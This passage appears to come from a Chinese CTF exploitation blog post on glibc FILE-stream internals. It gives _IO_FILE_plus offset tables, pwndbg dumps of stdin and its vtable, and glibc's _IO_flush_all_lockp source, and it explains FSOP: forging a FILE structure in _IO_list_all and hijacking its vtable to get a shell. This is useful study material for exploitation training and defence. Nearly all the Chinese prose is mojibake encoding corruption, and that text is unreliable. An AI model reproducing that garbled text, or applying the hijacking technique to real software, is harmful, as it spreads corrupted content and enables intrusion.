class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ray-cp/pwn_debug/pwn_debug/IO_FILE_plus.py</span><br><br>_IO_FILE_plus_size = &#123;<br><span class="hljs-string">&#x27;i386&#x27;</span>:<span class="hljs-number">0x98</span>,<br><span class="hljs-string">&#x27;amd64&#x27;</span>:<span class="hljs-number">0xe0</span><br>&#125;<br>_IO_FILE_plus = &#123;<br>    <span class="hljs-string">&#x27;i386&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x4</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0xc</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x14</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x1c</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x24</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x2c</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x34</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x3c</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x44</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x46</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x47</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x4c</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x54</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0x5c</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0x64</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0x6c</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0x94</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;,<br><br>    <span class="hljs-string">&#x27;amd64&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x50</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x70</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x74</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x78</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x80</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x82</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x83</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x88</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x90</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x98</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0xa8</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0xb0</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0xb8</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0xc0</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0xc4</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0xd8</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="vtable"><a class="header-anchor" href="#vtable">Â¶</a>vtable</h3><p><strong>vtable</strong> æ˜¯å¹²å•¥çš„ï¼Ÿ vtable æŒ‡é’ˆæŒ‡å‘çš„æ˜¯ ğŸ‘´ è¿™ä¸ª IOFILE ç»“æ„ä½“å¯¹åº”çš„å‡½æ•°è¡¨ï¼Œä¸Šè°ƒè¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stdin_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad208b</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffb4188da84</span>,<br>...<br>    _lock = <span class="hljs-number">0x7ffb4188f8d0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffb4188dae0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0xffffffff</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffb4188a2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ stdin ç»“æ„ä½“ï¼Œä¸‹é¢æ˜¯å®ƒçš„ vtableï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x *_IO_2_1_stdin_.vtable<br>$<span class="hljs-number">3</span> = &#123;<br>  __dummy = <span class="hljs-number">0x0</span>,<br>  __dummy2 = <span class="hljs-number">0x0</span>,<br>  __finish = <span class="hljs-number">0x7ffb4152e330</span>,<br>  __overflow = <span class="hljs-number">0x7ffb4152f300</span>,<br>  __underflow = <span class="hljs-number">0x7ffb4152f020</span>,<br>  __uflow = <span class="hljs-number">0x7ffb415303c0</span>,<br>  __pbackfail = <span class="hljs-number">0x7ffb41531c50</span>,<br>  __xsputn = <span class="hljs-number">0x7ffb4152d930</span>,<br>  __xsgetn = <span class="hljs-number">0x7ffb4152d590</span>,<br>  __seekoff = <span class="hljs-number">0x7ffb4152cb90</span>,<br>  __seekpos = <span class="hljs-number">0x7ffb41530990</span>,<br>  __setbuf = <span class="hljs-number">0x7ffb4152c850</span>,<br>  __sync = <span class="hljs-number">0x7ffb4152c6d0</span>,<br>  __doallocate = <span class="hljs-number">0x7ffb41520100</span>,<br>  __read = <span class="hljs-number">0x7ffb4152d910</span>,<br>  __write = <span class="hljs-number">0x7ffb4152d190</span>,<br>  __seek = <span class="hljs-number">0x7ffb4152c910</span>,<br>  __close = <span class="hljs-number">0x7ffb4152c840</span>,<br>  __stat = <span class="hljs-number">0x7ffb4152d180</span>,<br>  __showmanyc = <span class="hljs-number">0x7ffb41531dd0</span>,<br>  __imbue = <span class="hljs-number">0x7ffb41531de0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘åœ¨ stdin ç›¸å…³çš„ IO å‡½æ•°è°ƒç”¨å‡½æ•°æŒ‡é’ˆæ—¶å°±ä¼šä» stdin çš„ vtable é‡Œé¢æŸ¥æ‰¾ç›¸å…³çš„å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">   <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br> || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>     &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br> )<br>&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒº<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¿™ä¸ª <code>_IO_OVERFLOW</code> å°±ä¼šé¡ºç€ ğŸ‘´ çš„ stdin çš„ vtable æ‘¸åˆ° <code>__overflow = 0x7f3f23542790 &lt;_IO_new_file_overflow&gt;</code> ã€‚</p><p>å½“ç„¶è¿™é‡Œæ˜¯<strong>è°ƒç”¨ä¸äº†</strong> <code>_IO_OVERFLOW</code> çš„ï¼Œå› ä¸º ğŸ‘´ è¿˜æ²¡ ğŸ‘ å®ƒï¼Œæˆ‘åªæ˜¯ä¸¾ä¸ªä¾‹å­è¯´æ˜ä¸€ä¸‹ã€‚</p><h2 id="IO-list-all-æŒ‡é’ˆ"><a class="header-anchor" href="#IO-list-all-æŒ‡é’ˆ">Â¶</a>_IO_list_all æŒ‡é’ˆ</h2><p>å¤„äº libc æ®µçš„ _IO_list_all æŒ‡é’ˆè®°å½•ç€<strong>æœ€è¿‘</strong>ç”Ÿæˆçš„ _IO_FILE_plus ç»“æ„ä½“ï¼Œé€šè¿‡å•é“¾è¡¨çš„å½¢å¼æŠŠæ‰€æœ‰çš„ _IO_FILE_plus ç»“æ„ä½“ä¸²è”èµ·æ¥ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯é€šè¿‡æ²³é‡Œçš„æ”¹å†™è¯¥æŒ‡é’ˆï¼Œå¯ä»¥è¾¾åˆ°ä¼ªé€  _IO_FILE ç»“æ„ä½“çš„ä½œç”¨ï¼Œä¸ºè¿›ä¸€æ­¥çš„ ğŸ‘ åšå‡†å¤‡ã€‚</p><p>å¸¸ç”¨æ‰‹æ³•æ˜¯ unsortdebinï¼ŒLargebin ç­‰ Attack æ‰“ global_max_fast æ”¹å¤§ fastbin çš„æœ€å¤§ sizeï¼Œåœ¨ _IO_list_all å†™å †åœ°å€ï¼Œå½“ç„¶ç›´æ¥å¯¹ _IO_list_all å†»æ‰‹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¯¦ç»†çš„åé¢ä¼šæœ‰ä¾‹é¢˜ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/posts/20190627090036-f9501556-9876-1.png" alt=""></p><h2 id="IOè°ƒç”¨çš„vtableå‡½æ•°"><a class="header-anchor" href="#IOè°ƒç”¨çš„vtableå‡½æ•°">Â¶</a>IOè°ƒç”¨çš„vtableå‡½æ•°</h2><p>åœ¨è¿™é‡Œç»™å‡º <strong>raycp</strong> å¸ˆå‚…æ€»ç»“å‡ºçš„ <code>fopen</code>ã€<code>fread</code>ã€<code>fwrite</code>ã€<code>fclose</code>å››ä¸ªå‡½æ•°ä¼šè°ƒç”¨çš„vtableå‡½æ•°ã€‚æ²¡é”™ï¼Œæˆ‘ç›´æ¥ CV å¤§å¸ˆ ğŸ‘¦ï¼Œè®°ä¸è®°å¾—ä¸‹æ¥æˆ‘ä¸çŸ¥é“ï¼Œä»¥åèµ·ç ç¿»èµ·æ¥æ–¹ä¾¿å¾ˆå¤šã€‚</p><p>fopenå‡½æ•°æ˜¯åœ¨åˆ†é…ç©ºé—´ï¼Œå»ºç«‹FILEç»“æ„ä½“ï¼Œæœªè°ƒç”¨vtableä¸­çš„å‡½æ•°ã€‚</p><p>freadå‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li><code>_IO_sgetn</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_xsgetn</code>ã€‚</li><li><code>_IO_doallocbuf</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>__underflow</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_underflow</code>å®ç°æ–‡ä»¶æ•°æ®è¯»å–ã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_underflow</code>è°ƒç”¨äº†vtable<code>__GI__IO_file_read</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚</li></ul><p>fwrite å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li><code>_IO_fwrite</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_new_file_xsputn</code>ã€‚</li><li><code>_IO_new_file_xsputn</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_overflow</code>å®ç°ç¼“å†²åŒºçš„å»ºç«‹ä»¥åŠåˆ·æ–°ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_overflow</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>new_do_write</code>ä¸­çš„<code>_IO_SYSWRITE</code>è°ƒç”¨äº†vtable<code>_IO_new_file_write</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeã€‚</li></ul><p><code>fclose</code>å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li>åœ¨æ¸…ç©ºç¼“å†²åŒºçš„<code>_IO_do_write</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨vtableä¸­çš„å‡½æ•°ã€‚</li><li>å…³é—­æ–‡ä»¶æè¿°ç¬¦<code>_IO_SYSCLOSE</code>å‡½æ•°ä¸ºvtableä¸­çš„<code>__close</code>å‡½æ•°ã€‚</li><li><code>_IO_FINISH</code>å‡½æ•°ä¸ºvtableä¸­çš„<code>__finish</code>å‡½æ•°ã€‚</li></ul><p>å½“ç„¶ï¼ŒIO å‡½æ•°è¿œä¸æ­¢è¿™äº›ã€‚å…¶ä»–çš„ IO å‡½æ•°å†…è¿˜æœ‰å¾ˆå¤šå‡½æ•°æŒ‡é’ˆè¢«è°ƒç”¨äº†ï¼Œè¢«å„ä½å¸ˆå‚…ä»¬å‘æ˜å‡ºæ¥çš„å·²ç»æˆäº†å„å¤§ <code>House</code> äº†ï¼Œå‰©ä¸‹çš„åªèƒ½è¯´éšç¼˜çœ‹åˆ°äº†å°±çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨ã€‚</p><h2 id="FSOP-File-Stream-Oriented-Programming"><a class="header-anchor" href="#FSOP-File-Stream-Oriented-Programming">Â¶</a>FSOP(File Stream Oriented Programming)</h2><p><strong>FSOP</strong> è´¯ç©¿æ•´ä¸ª IO åˆ©ç”¨ï¼ŒğŸ‘´ å°è±¡ä¸­å¸¦ OP ä¿©å­—ä¸æ˜¯ <strong>Oæ³¡</strong> å°±æ˜¯ <strong>å¯¼å‘ç¼–ç¨‹</strong>ã€‚æ’é™¤æ³•å¾— FSOP æ˜¯å¯ä»¥å®ç°ç±»ä¼¼ ROP ä¸€æ ·çš„<strong>æ§åˆ¶æµåŠ«æŒ</strong>çš„ã€‚</p><p><strong>FSOP</strong> ä¸»è¦åˆ©ç”¨äº† <strong>_IO_flush_all_lockp</strong> å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯åˆ·æ–°æ‰€æœ‰FILEç»“æ„ä½“çš„è¾“å‡ºç¼“å†²åŒºï¼Œå…ˆæ”¾ä¸€æ®µä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>#éå† _IO_list_all<br>  <span class="hljs-title function_">for</span> <span class="hljs-params">(fp = (_IO_FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)</span><br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…³é”®åœ¨äºå®ƒè¿™é‡Œ<strong>éå†</strong>äº† <strong>_IO_list_all</strong> ï¼Œä¸”è°ƒç”¨äº† <strong>_IO_OVERFLOW</strong> è¿™ä¸ª <strong>vtable</strong> é‡Œé¢çš„å‡½æ•°ã€‚é€šè¿‡åŠ«æŒè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç©ä¸€ç³»åˆ—çš„æ“ä½œã€‚ä¸€èˆ¬æ€è·¯æ˜¯åœ¨å¯æ§åŒºåŸŸä¼ªé€ ä¸€ä¸ªç»“æ„ä½“ï¼Œå¡å…¥ <strong>_IO_list_all</strong> è¿™ä¸ªé“¾è¡¨é‡Œé¢ï¼ˆğŸ‘ å…¶ä»–ç»“æ„ä½“çš„ <strong>_chain</strong> æŒ‡é’ˆæˆ–è€…ç›´æ¥ ğŸ‘ _IO_list_all æŒ‡é’ˆï¼‰ã€‚ç„¶ååœ¨ä¼ªé€ çš„ç»“æ„ä½“å¤„åŠ«æŒ vtableã€‚</p><p>äº‹å®ä¸Šï¼Œä¼š<code>_IO_flush_all_lockp</code>è°ƒç”¨å‡½æ•°çš„æ—¶æœºåŒ…æ‹¬ï¼š</p><ul><li>libcæ‰§è¡Œabortå‡½æ•°æ—¶ï¼ˆå†…å­˜é”™è¯¯ï¼‰ã€‚åˆ«çš„å¸ˆå‚…æœ‰å†™åˆ° <strong>libc &lt; 2.26</strong> æœ‰æ•ˆï¼Œæ²¡å…·ä½“è¯•è¿‡ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©æ‰“ <strong>Kiwi</strong>ã€‚</li><li>ç¨‹åºæ˜¾å¼è°ƒç”¨ exit å‡½æ•°æ—¶ï¼Œ<code>_exit</code> ä¸è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‰“ <strong>Kiwi</strong>ã€‚</li><li>ç¨‹åºä»mainå‡½æ•°è¿”å›æ—¶ï¼Œç»“æŸæ—¶ç›´æ¥è°ƒ <code>syscall</code> ä¹Ÿä¸è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‰“ <strong>Kiwi</strong>ã€‚</li></ul><p>æ‹¿ä¸€å¼  CTF-Wiki çš„å›¾ï¼Œè™½ç„¶æ‰“å°å‡ºäº†æŠ¥é”™ä¿¡æ¯ï¼Œè¿˜æ˜¯æ‰§è¡Œäº† <strong>_IO_OVERFLOW</strong> è¿™ä¸ªå‡½æ•°ã€‚æ‰€ä»¥ä¸€é¡¿æ“ä½œç›´æ¥æ‰“å‡ºäº†é”™è¯¯ä¿¡æ¯çš„åŒæ—¶<code>getshell</code> æˆ–è€… <code>orw flag</code> éƒ½æ˜¯åŸºæ§½ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/abort_routine.001.jpeg" alt=""></p><p>çœ‹ä¸‹ä¸Šè¿°ä¸‰ç§æƒ…å†µçš„å †æ ˆï¼Œæ¥è¿›ä¸€æ­¥äº†è§£ç¨‹åºçš„æµç¨‹ã€‚å°†æ–­ç‚¹ä¸‹åœ¨<code>_IO_flush_all_lockp</code>ï¼ŒæŸ¥çœ‹æ ˆç»“æ„ã€‚</p><h3 id="Abort-æ ˆå›æº¯"><a class="header-anchor" href="#Abort-æ ˆå›æº¯">Â¶</a>Abort æ ˆå›æº¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>__GI_abort ()<br>__libc_message (do_abort=do_abort@entry=<span class="hljs-number">0x2</span>, fmt=fmt@entry=<span class="hljs-number">0x7ffff7ba0d58</span> <span class="hljs-string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>)<br>malloc_printerr (action=<span class="hljs-number">0x3</span>, str=<span class="hljs-number">0x7ffff7ba0e90</span> <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>, ptr=&lt;optimized out&gt;, ar_ptr=&lt;optimized out&gt;)<br>_int_free (av=<span class="hljs-number">0x7ffff7dd4b20</span> &lt;main_arena&gt;, p=&lt;optimized out&gt;,have_lock=<span class="hljs-number">0x0</span>)<br>main ()<br>__libc_start_main (main=<span class="hljs-number">0x400566</span> &lt;main&gt;, argc=<span class="hljs-number">0x1</span>, argv=<span class="hljs-number">0x7fffffffe578</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="hljs-number">0x7fffffffe568</span>)<br>_start ()<br></code></pre></td></tr></table></figure><h3 id="exit-æ ˆå›æº¯"><a class="header-anchor" href="#exit-æ ˆå›æº¯">Â¶</a>exit æ ˆå›æº¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span 